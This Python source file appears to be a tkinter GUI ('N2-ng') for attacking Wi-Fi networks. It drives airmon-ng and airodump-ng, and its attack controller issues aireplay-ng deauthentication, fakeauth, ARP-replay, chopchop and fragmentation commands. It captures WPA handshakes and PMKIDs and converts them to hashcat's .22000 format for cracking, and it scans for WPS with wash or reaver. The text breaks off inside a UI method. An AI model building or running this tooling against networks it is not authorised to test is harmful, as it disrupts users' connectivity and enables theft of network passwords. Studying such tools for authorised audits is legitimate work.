#!/usr/bin/env python3
import atexit
import copy
import csv
import io
import json
import os
import queue
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
from collections import deque
from pathlib import Path
import tkinter as tk
from tkinter import messagebox, simpledialog, ttk


THEME = {
    "bg": "#000000",
    "fg": "#00ff41",
    "panel": "#1a1a1a",
    "accent": "#00ff41",
    "warn": "#ffcc00",
    "error": "#ff4444",
    "info": "#00ccff",
}


def format_bssid(bssid: str) -> str:
    return bssid.upper().strip()


def _airodump_supports(flag: str) -> bool:
    """Return True if the installed airodump-ng supports ``flag``.

    The help text format varies across aircrack-ng versions; we look for the
    flag literally in the help output so unsupported flags don't crash the scan.
    """
    try:
        out = subprocess.check_output(["airodump-ng", "--help"], text=True, stderr=subprocess.STDOUT)
        return flag in out
    except Exception:
        return False


def sanitize_essid(essid: str, bssid: str) -> str:
    essid = essid.strip()
    bssid = format_bssid(bssid).replace(":", "-")
    if not essid or essid.lower().startswith("<length:") or essid == "":
        base = f"hidden_{bssid}"
    else:
        safe = re.sub(r'[\\/:*?"<>|]', "", essid)
        safe = safe.replace(" ", "_")
        safe = safe[:50]
        base = f"{safe}_{bssid}"
    return base


def human_size(size: int) -> str:
    if size < 1024:
        return f"{size} B"
    for unit in ("KB", "MB", "GB"):
        size /= 1024.0
        if size < 1024:
            return f"{size:.1f} {unit}"
    return f"{size:.1f} GB"


def user_home() -> Path:
    """Return the original user's home directory even when running under sudo."""
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        try:
            import pwd
            return Path(pwd.getpwnam(sudo_user).pw_dir)
        except Exception:
            pass
    return Path.home()


class DependencyChecker:
    TOOLS = {
        "aircrack-ng": {
            "cmd": "aircrack-ng",
            "apt": "sudo apt install -y aircrack-ng",
            "url": "https://github.com/aircrack-ng/aircrack-ng",
        },
        "hcxpcapngtool": {
            "cmd": "hcxpcapngtool",
            "apt": "sudo apt install -y hcxtools",
            "url": "https://github.com/ZerBea/hcxtools",
        },
        "wash": {
            "cmd": "wash",
            "apt": "sudo apt install -y reaver",
            "url": "https://github.com/t6x/reaver-wps-fork-t6x",
        },
        "mergecap": {
            "cmd": "mergecap",
            "apt": "sudo apt install -y wireshark-common",
            "url": "https://www.wireshark.org/download.html",
        },
        "pcapfix": {
            "cmd": "pcapfix",
            "apt": "sudo apt install -y pcapfix",
            "url": "https://github.com/Rup0rt/pcapfix",
        },
    }

    @classmethod
    def check_all(cls) -> list[str]:
        missing = []
        for name, info in cls.TOOLS.items():
            if subprocess.run(["which", info["cmd"]], capture_output=True).returncode != 0:
                missing.append(name)
        return missing


class AirmonManager:
    """Detect wireless adapters and manage monitor mode dynamically."""

    def __init__(self):
        # Maps original interface -> detected monitor interface
        self._mon_map: dict[str, str] = {}

    @staticmethod
    def _list_interfaces() -> set[str]:
        ifaces = set()
        try:
            out = subprocess.check_output(["ip", "link"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r"^(?:\d+:\s+)?(\S+):", line)
                if m and m.group(1) != "lo":
                    ifaces.add(m.group(1))
        except Exception:
            pass
        return ifaces

    @staticmethod
    def _iface_mode(iface: str) -> str | None:
        try:
            out = subprocess.check_output(["iw", "dev", iface, "info"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r"type\s+(\w+)", line)
                if m:
                    return m.group(1).lower()
        except Exception:
            pass
        return None

    @staticmethod
    def _is_monitor(iface: str) -> bool:
        return AirmonManager._iface_mode(iface) == "monitor"

    def list_physical_interfaces(self) -> list[str]:
        result = []
        try:
            out = subprocess.check_output(["airmon-ng"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines()[2:]:
                parts = line.split()
                # airmon-ng layout: phyN <iface> <driver> <chipset>
                if len(parts) >= 2 and parts[1].startswith(("wlan", "wlp")) and not parts[1].endswith("mon"):
                    result.append(parts[1])
        except Exception:
            pass
        try:
            out = subprocess.check_output(["ip", "link"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r"^(?:\d+:\s+)?([ew]lan\d+|wlp\S+?):", line)
                if m:
                    name = m.group(1)
                    if name not in result and not name.endswith("mon"):
                        result.append(name)
        except Exception:
            pass
        return sorted(result)

    def _manual_monitor(self, iface: str) -> bool:
        try:
            subprocess.run(["ip", "link", "set", iface, "down"], check=True, capture_output=True)
            subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], check=True, capture_output=True)
            subprocess.run(["ip", "link", "set", iface, "up"], check=True, capture_output=True)
            return self._is_monitor(iface)
        except Exception:
            return False

    def start_monitor(self, iface: str) -> str:
        # Stop any previous monitor for this iface
        self.stop_monitor_for_iface(iface)
        before = self._list_interfaces()
        try:
            subprocess.run(["airmon-ng", "start", iface], check=True, capture_output=True, text=True)
        except subprocess.CalledProcessError:
            # airmon-ng failed; try manual iw sequence
            if self._manual_monitor(iface):
                self._mon_map[iface] = iface
                return iface
            raise RuntimeError(f"airmon-ng and manual iw both failed for {iface}")

        after = self._list_interfaces()
        new_ifaces = after - before
        # Prefer new interfaces that are monitor mode
        for cand in new_ifaces:
            if self._is_monitor(cand):
                self._mon_map[iface] = cand
                return cand
        # If no new interface, original may have been converted
        if self._is_monitor(iface):
            self._mon_map[iface] = iface
            return iface
        # Fallback: any existing monitor interface
        for cand in after:
            if self._is_monitor(cand):
                self._mon_map[iface] = cand
                return cand
        raise RuntimeError(f"Could not determine monitor interface for {iface}")

    def stop_monitor_for_iface(self, iface: str) -> None:
        mon = self._mon_map.pop(iface, None)
        if mon and mon != iface:
            subprocess.run(["airmon-ng", "stop", mon], capture_output=True, text=True)
        elif mon == iface:
            # Original iface was converted; set back to managed
            try:
                subprocess.run(["ip", "link", "set", iface, "down"], check=True, capture_output=True)
                subprocess.run(["iw", "dev", iface, "set", "type", "managed"], check=True, capture_output=True)
                subprocess.run(["ip", "link", "set", iface, "up"], check=True, capture_output=True)
            except Exception:
                pass
        # Also try airmon-ng stop on original name as safety net
        subprocess.run(["airmon-ng", "stop", iface], capture_output=True, text=True)

    def stop_monitor(self, mon_iface: str) -> None:
        if mon_iface:
            subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True, text=True)

    def cleanup(self) -> None:
        for iface in list(self._mon_map.keys()):
            self.stop_monitor_for_iface(iface)

    @staticmethod
    def _iface_exists(name: str) -> bool:
        return Path(f"/sys/class/net/{name}").exists()


def _normalize_csv_reader(reader: csv.DictReader):
    """Return fieldnames with surrounding whitespace stripped."""
    if reader.fieldnames:
        reader.fieldnames = [fn.strip() for fn in reader.fieldnames]
    return reader


def parse_airodump_csv(text: str):
    networks = []
    clients = []
    text = text.strip()
    if not text:
        return networks, clients
    sections = text.split("\n\n")
    if not sections:
        return networks, clients
    # Strip leading/trailing whitespace from each line to handle indented samples
    ap_lines = "\n".join(line.strip() for line in sections[0].splitlines())
    reader = _normalize_csv_reader(csv.DictReader(io.StringIO(ap_lines)))
    for row in reader:
        bssid = format_bssid(row.get("BSSID", ""))
        essid = row.get("ESSID", "").strip()
        if not essid or essid.lower().startswith("<length:"):
            essid = "[Hidden]"
        networks.append({
            "bssid": bssid,
            "first": row.get("First time seen", "").strip(),
            "last": row.get("Last time seen", "").strip(),
            "channel": row.get("channel", "").strip(),
            "speed": row.get("Speed", "").strip(),
            "privacy": row.get("Privacy", "").strip(),
            "cipher": row.get("Cipher", "").strip(),
            "auth": row.get("Authentication", "").strip(),
            "power": row.get("Power", "").strip(),
            "beacons": row.get("# Beacons", "").strip(),
            "iv": row.get("# IV", "").strip(),
            "id_len": row.get("ID-length", "").strip(),
            "manufacturer": row.get("Manufacturer", "").strip(),
            "essid": essid,
        })
    if len(sections) > 1:
        client_lines = "\n".join(line.strip() for line in sections[1].splitlines())
        reader = _normalize_csv_reader(csv.DictReader(io.StringIO(client_lines)))
        for row in reader:
            clients.append({
                "station": format_bssid(row.get("Station MAC", "")),
                "first": row.get("First time seen", "").strip(),
                "last": row.get("Last time seen", "").strip(),
                "power": row.get("Power", "").strip(),
                "packets": row.get("# packets", "").strip(),
                "bssid": format_bssid(row.get("BSSID", "")),
                "probed": row.get("Probed ESSIDs", "").strip(),
            })
    return networks, clients


class Settings:
    """Persistent airodump-ng settings stored in ~/.config/n2-ng/settings.json."""

    DEFAULTS = {
        "color_output": False,
        "sort_by": "PWR",
        "realtime_sort": False,
        "write_interval": 1,
        "output_formats": ["csv", "cap"],
        "show_manufacturers": False,
        "filter_encryption": "All",
        "quiet_mode": False,
    }

    def __init__(self):
        self.path = user_home() / ".config" / "n2-ng" / "settings.json"
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self.data = dict(self.DEFAULTS)
        self.load()

    def load(self):
        if self.path.exists():
            try:
                self.data.update(json.loads(self.path.read_text()))
            except Exception:
                pass

    def save(self):
        try:
            self.path.write_text(json.dumps(self.data, indent=2))
        except Exception as e:
            print(f"Failed to save settings: {e}")

    def get(self, key):
        return self.data.get(key, self.DEFAULTS.get(key))

    def set(self, key, value):
        self.data[key] = value


class AirodumpWorker(threading.Thread):
    """Run airodump-ng and parse its CSV output."""

    def __init__(self, event_queue: queue.Queue, settings: Settings):
        super().__init__(daemon=True)
        self.queue = event_queue
        self.settings = settings
        self._proc = None
        self._prefix = "/tmp/n2ng_scan"
        self._running = threading.Event()
        self._paused = threading.Event()
        self._last_cmd = None
        self._last_mon_iface = None
        self._last_band = None
        self._last_channel = None
        self._last_bssid = None
        self._data_lock = threading.Lock()
        self._latest_networks: list[dict] = []
        self._latest_clients: list[dict] = []

    def _build_base_cmd(self, prefix: str) -> list[str]:
        fmt = ",".join(self.settings.get("output_formats"))
        cmd = [
            "airodump-ng",
            "--write-interval", str(self.settings.get("write_interval")),
            "-w", prefix,
            "--output-format", fmt,
        ]
        # Only pass flags the installed airodump-ng understands.
        if _airodump_supports("--color"):
            if self.settings.get("color_output"):
                cmd.append("--color")
            else:
                cmd.extend(["--color", "0"])
        if self.settings.get("quiet_mode") and _airodump_supports("-q"):
            cmd.append("-q")
        if self.settings.get("show_manufacturers"):
            cmd.append("-M")
        return cmd

    def start_scan(self, mon_iface: str, band: str, prefix: str):
        self.stop()
        self._prefix = prefix
        self._last_mon_iface = mon_iface
        self._last_band = band
        band_arg = {"2.4GHz": "bg", "5GHz": "a", "Both": "abg"}.get(band, "abg")
        cmd = self._build_base_cmd(prefix)
        cmd.extend(["--band", band_arg, mon_iface])
        self._last_cmd = cmd
        self._running.set()
        self._paused.clear()
        self._proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not self.is_alive():
            self.start()

    def start_lock(self, mon_iface: str, channel: int, bssid: str, prefix: str):
        self.stop()
        self._prefix = prefix
        self._last_mon_iface = mon_iface
        self._last_channel = channel
        self._last_bssid = bssid
        cmd = self._build_base_cmd(prefix)
        cmd.extend(["-c", str(channel), "--bssid", bssid, mon_iface])
        self._last_cmd = cmd
        self._running.set()
        self._paused.clear()
        self._proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not self.is_alive():
            self.start()

    def restart_with_settings(self):
        """Restart the current scan/lock with updated settings."""
        if self._last_mon_iface and self._last_band:
            self.start_scan(self._last_mon_iface, self._last_band, self._prefix)
        elif self._last_mon_iface and self._last_channel and self._last_bssid:
            self.start_lock(self._last_mon_iface, self._last_channel, self._last_bssid, self._prefix)

    def pause(self):
        if self._proc and not self._paused.is_set():
            self._proc.send_signal(signal.SIGSTOP)
            self._paused.set()

    def resume(self):
        if self._proc and self._paused.is_set():
            self._proc.send_signal(signal.SIGCONT)
            self._paused.clear()

    def is_paused(self) -> bool:
        return self._paused.is_set()

    def stop(self):
        self._running.clear()
        if self._proc:
            try:
                if self._paused.is_set():
                    self._proc.send_signal(signal.SIGCONT)
                self._proc.terminate()
                self._proc.wait(timeout=2)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None
        self._paused.clear()

    def run(self):
        """Loop A: parse airodump-ng CSV into a shared buffer as fast as possible.

        The capture/channel hopping itself is handled by the airodump-ng
        subprocess; this thread polls the CSV output and updates the shared
        buffer every 200 ms.  Display rendering happens independently in Loop B.
        """
        csv_path = Path(f"{self._prefix}-01.csv")
        last_mtime = 0
        poll_interval = 0.2  # 200 ms
        while self._running.is_set():
            if not self._paused.is_set() and csv_path.exists():
                try:
                    mtime = csv_path.stat().st_mtime
                    if mtime != last_mtime:
                        last_mtime = mtime
                        text = csv_path.read_text(encoding="utf-8", errors="ignore")
                        networks, clients = parse_airodump_csv(text)
                        with self._data_lock:
                            self._latest_networks = networks
                            self._latest_clients = clients
                except Exception as e:
                    self.queue.put(("error", str(e)))
            time.sleep(poll_interval)

    def get_latest(self) -> tuple[list[dict], list[dict]]:
        """Return a deep copy of the most recently parsed networks and clients."""
        with self._data_lock:
            return copy.deepcopy(self._latest_networks), copy.deepcopy(self._latest_clients)


class SignalGraph:
    """Simple tkinter Canvas line graph for received signal strength."""

    def __init__(self, parent):
        self.canvas = tk.Canvas(parent, bg=THEME["panel"], height=120, highlightthickness=0)
        self.canvas.pack(fill=tk.X, padx=5, pady=5)
        self.samples = deque(maxlen=60)

    def add_sample(self, pwr):
        try:
            val = int(pwr)
        except (TypeError, ValueError):
            val = -100
        self.samples.append(val)
        self._draw()

    def _draw(self):
        self.canvas.delete("all")
        w = self.canvas.winfo_width()
        h = self.canvas.winfo_height()
        if w < 10:
            self.canvas.after(100, self._draw)
            return
        for y in range(0, h, 20):
            self.canvas.create_line(0, y, w, y, fill="#333333")
        if len(self.samples) < 2:
            return
        step = w / (len(self.samples) - 1)
        points = []
        for i, val in enumerate(self.samples):
            y = h - ((max(-90, min(-30, val)) + 90) / 60) * h
            points.append((i * step, y))
        flat = [c for p in points for c in p]
        self.canvas.create_line(flat, fill=THEME["accent"], width=2)


class CountdownDialog(tk.Toplevel):
    """Modal dialog showing the exact attack command with a 3-second countdown."""

    def __init__(self, parent, command: list[str]):
        super().__init__(parent)
        self.title("Confirm Attack")
        self.configure(bg=THEME["bg"])
        self.resizable(False, False)
        tk.Label(self, text="Command to execute:", bg=THEME["bg"], fg=THEME["fg"]).pack(padx=10, pady=5)
        cmd_text = tk.Entry(self, width=80)
        cmd_text.insert(0, " ".join(command))
        cmd_text.config(state="readonly", bg=THEME["panel"], fg=THEME["fg"])
        cmd_text.pack(padx=10, pady=5)
        self.label = tk.Label(self, text="Executing in 3...", bg=THEME["bg"], fg=THEME["fg"], font=("TkDefaultFont", 12, "bold"))
        self.label.pack(padx=10, pady=10)
        btn_frame = tk.Frame(self, bg=THEME["bg"])
        btn_frame.pack(pady=5)
        tk.Button(btn_frame, text="Cancel", command=self._cancel, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Execute Now", command=self._execute, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        self.result = False
        self.count = 3
        self._tick()
        self.transient(parent)
        self.grab_set()

    def _tick(self):
        if self.result or not self.winfo_exists():
            return
        if self.count <= 0:
            self._execute()
            return
        self.label.config(text=f"Executing in {self.count}...")
        self.count -= 1
        self.after(1000, self._tick)

    def _execute(self):
        self.result = True
        self.destroy()

    def _cancel(self):
        self.result = False
        self.destroy()


class AttackController:
    """Build and run aireplay-ng commands, streaming output to a log callback."""

    def __init__(self, log_func):
        self.log = log_func
        self._current = None

    def _run(self, cmd: list[str]):
        self.log(f"$ {' '.join(cmd)}")
        self._current = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        for line in self._current.stdout:
            self.log(line.rstrip())
        self._current.wait()
        self._current = None

    def deauth_all(self, bssid: str, mon_iface: str, count: int = 10):
        cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, mon_iface]
        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()

    def deauth_client(self, bssid: str, client: str, mon_iface: str, count: int = 10):
        cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client, mon_iface]
        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()

    def legacy_attack(self, kind: str, bssid: str, our_mac: str, mon_iface: str):
        flag = {"fakeauth": "-1", "arpreplay": "-3", "chopchop": "-4", "fragmentation": "-5"}[kind]
        if kind == "fakeauth":
            cmd = ["aireplay-ng", flag, "0", "-a", bssid, "-h", our_mac, mon_iface]
        else:
            cmd = ["aireplay-ng", flag, "-b", bssid, "-h", our_mac, mon_iface]
        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()


class CaptureManager:
    """Manage capture files, poll .cap for handshake/PMKID, and convert to .22000."""

    def __init__(self, event_queue: queue.Queue, log_func):
        self.queue = event_queue
        self.log = log_func
        self.active_cap: Path | None = None
        self.handshake_found = False
        self.pmkid_found = False
        self._last_size = 0

    def set_active_cap(self, cap_path: Path):
        self.active_cap = cap_path
        self.handshake_found = False
        self.pmkid_found = False
        self._last_size = 0

    def get_size(self) -> int:
        if self.active_cap and self.active_cap.exists():
            return self.active_cap.stat().st_size
        return 0

    def poll(self):
        if not self.active_cap or not self.active_cap.exists():
            return
        size = self.get_size()
        if size == self._last_size:
            return
        self._last_size = size
        out22000 = self.active_cap.with_suffix(".22000")
        tmp = self.active_cap.with_suffix(".tmp22000")
        rc = None
        if shutil.which("hcxpcapngtool"):
            rc = subprocess.run(
                ["hcxpcapngtool", "-o", str(tmp), str(self.active_cap)],
                capture_output=True, text=True
            )
        elif shutil.which("aircrack-ng"):
            base = str(tmp.with_suffix(""))
            rc = subprocess.run(
                ["aircrack-ng", str(self.active_cap), "-J", base],
                capture_output=True, text=True
            )
            tmp = Path(base + ".hccap")
        else:
            return
        if rc and rc.returncode == 0 and tmp.exists() and tmp.stat().st_size > 0:
            shutil.move(str(tmp), str(out22000))
            self._classify(out22000)
        elif tmp.exists():
            tmp.unlink(missing_ok=True)

    def _classify(self, path: Path):
        text = path.read_text(errors="ignore")
        if "WPA*02" in text and not self.handshake_found:
            self.handshake_found = True
            self.queue.put(("handshake", {"file": str(path), "type": "handshake"}))
        if "WPA*01" in text and not self.pmkid_found:
            self.pmkid_found = True
            self.queue.put(("pmkid", {"file": str(path), "type": "pmkid"}))

    def convert(self, cap: Path) -> Path | None:
        out = cap.with_suffix(".22000")
        if shutil.which("hcxpcapngtool"):
            rc = subprocess.run(["hcxpcapngtool", "-o", str(out), str(cap)], capture_output=True, text=True)
            if rc.returncode == 0 and out.exists() and out.stat().st_size > 0:
                return out
        return None

    def merge(self, caps: list[Path], output: Path) -> bool:
        if not shutil.which("mergecap"):
            return False
        cmd = ["mergecap", "-w", str(output)] + [str(c) for c in caps]
        rc = subprocess.run(cmd, capture_output=True, text=True)
        return rc.returncode == 0 and output.exists() and output.stat().st_size > 0

    def fix(self, cap: Path) -> Path | None:
        if not shutil.which("pcapfix"):
            return None
        out = cap.with_suffix(".fixed.cap")
        rc = subprocess.run(["pcapfix", str(cap), str(out)], capture_output=True, text=True)
        if rc.returncode == 0 and out.exists() and out.stat().st_size > 0:
            return out
        return None


class WpsScanner(threading.Thread):
    """Run wash or reaver --scan and report lines via callback."""

    def __init__(self, mon_iface: str, callback):
        super().__init__(daemon=True)
        self.mon_iface = mon_iface
        self.callback = callback
        self._stop = threading.Event()
        self._proc = None

    def run(self):
        cmd = None
        if shutil.which("wash"):
            cmd = ["wash", "-i", self.mon_iface]
        elif shutil.which("reaver"):
            cmd = ["reaver", "-i", self.mon_iface, "--scan"]
        else:
            self.callback("error", "wash/reaver not found")
            return
        self._proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        while not self._stop.is_set():
            line = self._proc.stdout.readline()
            if not line:
                break
            self.callback("wps_line", line.strip())
        self._proc.terminate()

    def stop(self):
        self._stop.set()
        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=2)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass


class SettingsDialog(tk.Toplevel):
    """Modal dialog for airodump-ng settings."""

    SORT_OPTIONS = ["PWR", "Beacons", "#Data", "CH", "ESSID", "BSSID"]
    FILTER_OPTIONS = ["All", "WEP only", "WPA/WPA2 only", "WPA3 only", "Open only"]
    FORMAT_OPTIONS = ["csv", "cap", "kismet", "pcap"]

    def __init__(self, parent, settings: Settings, apply_callback):
        super().__init__(parent)
        self.title("Airodump Settings")
        self.configure(bg=THEME["bg"])
        self.resizable(False, False)
        self.settings = settings
        self.apply_callback = apply_callback
        self._build()
        self.transient(parent)
        self.grab_set()

    def _build(self):
        frame = tk.Frame(self, bg=THEME["bg"])
        frame.pack(padx=10, pady=10)

        # Color output
        self.color_var = tk.BooleanVar(value=self.settings.get("color_output"))
        tk.Checkbutton(frame, text="Color output (airodump-ng --color)", variable=self.color_var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).grid(row=0, column=0, sticky=tk.W, columnspan=2)

        # Quiet mode
        self.quiet_var = tk.BooleanVar(value=self.settings.get("quiet_mode"))
        tk.Checkbutton(frame, text="Quiet mode (-q)", variable=self.quiet_var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).grid(row=1, column=0, sticky=tk.W, columnspan=2)

        # Realtime sort
        self.realtime_var = tk.BooleanVar(value=self.settings.get("realtime_sort"))
        tk.Checkbutton(frame, text="Realtime sort (interactive 'r')", variable=self.realtime_var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).grid(row=2, column=0, sticky=tk.W, columnspan=2)

        # Show manufacturers
        self.mfg_var = tk.BooleanVar(value=self.settings.get("show_manufacturers"))
        tk.Checkbutton(frame, text="Show manufacturers (-M)", variable=self.mfg_var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).grid(row=3, column=0, sticky=tk.W, columnspan=2)

        # Sort by
        tk.Label(frame, text="Sort by:", bg=THEME["bg"], fg=THEME["fg"]).grid(row=4, column=0, sticky=tk.W)
        self.sort_var = tk.StringVar(value=self.settings.get("sort_by"))
        tk.OptionMenu(frame, self.sort_var, *self.SORT_OPTIONS).grid(row=4, column=1, sticky=tk.W)

        # Filter encryption
        tk.Label(frame, text="Filter encryption:", bg=THEME["bg"], fg=THEME["fg"]).grid(row=5, column=0, sticky=tk.W)
        self.filter_var = tk.StringVar(value=self.settings.get("filter_encryption"))
        tk.OptionMenu(frame, self.filter_var, *self.FILTER_OPTIONS).grid(row=5, column=1, sticky=tk.W)

        # Write interval
        tk.Label(frame, text="Write interval (s):", bg=THEME["bg"], fg=THEME["fg"]).grid(row=6, column=0, sticky=tk.W)
        self.interval_var = tk.IntVar(value=self.settings.get("write_interval"))
        tk.Spinbox(frame, from_=1, to=60, textvariable=self.interval_var, width=5).grid(row=6, column=1, sticky=tk.W)

        # Output formats
        tk.Label(frame, text="Output formats:", bg=THEME["bg"], fg=THEME["fg"]).grid(row=7, column=0, sticky=tk.W)
        fmt_frame = tk.Frame(frame, bg=THEME["bg"])
        fmt_frame.grid(row=7, column=1, sticky=tk.W)
        self.format_vars = {}
        for i, fmt in enumerate(self.FORMAT_OPTIONS):
            var = tk.BooleanVar(value=fmt in self.settings.get("output_formats"))
            self.format_vars[fmt] = var
            tk.Checkbutton(fmt_frame, text=fmt, variable=var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).pack(side=tk.LEFT)

        # Buttons
        btn_frame = tk.Frame(self, bg=THEME["bg"])
        btn_frame.pack(pady=10)
        tk.Button(btn_frame, text="Apply", command=self._apply, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Cancel", command=self.destroy, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)

    def _apply(self):
        self.settings.set("color_output", self.color_var.get())
        self.settings.set("quiet_mode", self.quiet_var.get())
        self.settings.set("realtime_sort", self.realtime_var.get())
        self.settings.set("show_manufacturers", self.mfg_var.get())
        self.settings.set("sort_by", self.sort_var.get())
        self.settings.set("filter_encryption", self.filter_var.get())
        self.settings.set("write_interval", self.interval_var.get())
        formats = [fmt for fmt, var in self.format_vars.items() if var.get()]
        if "csv" not in formats:
            formats.insert(0, "csv")
        if "cap" not in formats:
            formats.append("cap")
        self.settings.set("output_formats", formats)
        self.settings.save()
        self.apply_callback()
        self.destroy()


class N2NgApp:
    """Main tkinter application."""

    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("N2-ng")
        self.root.geometry("1200x700")
        self.root.minsize(1000, 600)
        self.root.configure(bg=THEME["bg"])

        self.queue = queue.Queue()
        self.settings = Settings()
        self.airmon = AirmonManager()
        self.worker = AirodumpWorker(self.queue, self.settings)
        self.capture_manager = CaptureManager(self.queue, self._log)
        self.attack = AttackController(self._log)

        self.networks: dict[str, dict] = {}
        self.clients: list[dict] = []
        self.locked_target: dict | None = None
        self.mon_iface: str | None = None
        self.current_band = tk.StringVar(value="Both")
        self.adapter_var = tk.StringVar()
        self.poll_id = None
        self._paused = False

        self._configure_ttk_styles()
        self._build_ui()
        self._refresh_adapters()
        self._poll_queue()
        self.root.after(100, self._check_dependencies)

        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        atexit.register(self._cleanup)

    # ------------------------------------------------------------------
    # UI construction
    # ------------------------------------------------------------------
    def _configure_ttk_styles(self):
        """Apply the dark theme to ttk widgets (Treeview, Scrollbar, etc.)."""
        style = ttk.Style(self.root)
        # Prefer the clam theme because it reliably honors custom colors.
        if "clam" in style.theme_names():
            style.theme_use("clam")
        style.configure(
            "Treeview",
            background=THEME["bg"],
            foreground=THEME["fg"],
            fieldbackground=THEME["bg"],
            rowheight=22,
        )
        style.configure(
            "Treeview.Heading",
            background=THEME["panel"],
            foreground=THEME["fg"],
        )
        style.map(
            "Treeview",
            background=[("selected", THEME["accent"])],
            foreground=[("selected", THEME["bg"])],
        )
        style.configure(
            "Vertical.TScrollbar",
            background=THEME["panel"],
            troughcolor=THEME["bg"],
            bordercolor=THEME["bg"],
            arrowcolor=THEME["fg"],
        )
        style.configure(
            "Horizontal.TScrollbar",
            background=THEME["panel"],
            troughcolor=THEME["bg"],
            bordercolor=THEME["bg"],
            arrowcolor=THEME["fg"],
        )

    def _build_ui(self):
        self._build_toolbar()

        content_frame = tk.Frame(self.root, bg=THEME["bg"])
        content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Left: network tree
        left_frame = tk.Frame(content_frame, bg=THEME["bg"])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self._build_network_tree(left_frame)

        # Right: detail panel
        right_frame = tk.Frame(content_frame, bg=THEME["bg"], width=420)
        right_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=(5, 0))
        right_frame.pack_propagate(False)
        self._build_right_panel(right_frame)

        self._build_log_pane()
        self._build_status_bar()

    def _build_toolbar(self):
        toolbar = tk.Frame(self.root, bg=THEME["panel"])
        toolbar.pack(side=tk.TOP, fill=tk.X, padx=5, pady=5)

        tk.Label(toolbar, text="Adapter:", bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        self.adapter_combo = tk.OptionMenu(toolbar, self.adapter_var, "")
        self.adapter_combo.config(bg=THEME["panel"], fg=THEME["fg"], highlightthickness=0)
        self.adapter_combo["menu"].config(bg=THEME["panel"], fg=THEME["fg"])
        self.adapter_combo.pack(side=tk.LEFT, padx=5)

        tk.Label(toolbar, text="Band:", bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        band_menu = tk.OptionMenu(toolbar, self.current_band, "2.4GHz", "5GHz", "Both")
        band_menu.config(bg=THEME["panel"], fg=THEME["fg"], highlightthickness=0)
        band_menu["menu"].config(bg=THEME["panel"], fg=THEME["fg"])
        band_menu.pack(side=tk.LEFT, padx=5)

        tk.Button(toolbar, text="Start Monitor", command=self._start_monitor, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="Stop Monitor", command=self._stop_monitor, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="WPS Scan", command=self._wps_scan, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="Refresh Adapters", command=self._refresh_adapters, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="Settings", command=self._open_settings, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        self.pause_btn = tk.Button(toolbar, text="Pause Scan", command=self._toggle_pause, bg=THEME["panel"], fg=THEME["fg"])
        self.pause_btn.pack(side=tk.LEFT, padx=5)

        self.channel_pill = tk.Label(toolbar, text="SCANNING ALL", bg="red", fg="white", font=("TkDefaultFont", 10, "bold"))
        self.channel_pill.pack(side=tk.RIGHT, padx=10)

    def _build_network_tree(self, parent):
        if self.settings.get("show_manufacturers"):
            cols = ("pwr", "beacons", "data", "ch", "mb", "enc", "cipher", "auth", "mfg", "essid", "bssid")
            headings = {
                "pwr": "PWR", "beacons": "Beacons", "data": "#Data", "ch": "CH",
                "mb": "MB", "enc": "ENC", "cipher": "CIPHER", "auth": "AUTH",
                "mfg": "Manufacturer", "essid": "ESSID", "bssid": "BSSID",
            }
        else:
            cols = ("pwr", "beacons", "data", "ch", "mb", "enc", "cipher", "auth", "essid", "bssid")
            headings = {
                "pwr": "PWR", "beacons": "Beacons", "data": "#Data", "ch": "CH",
                "mb": "MB", "enc": "ENC", "cipher": "CIPHER", "auth": "AUTH",
                "essid": "ESSID", "bssid": "BSSID",
            }
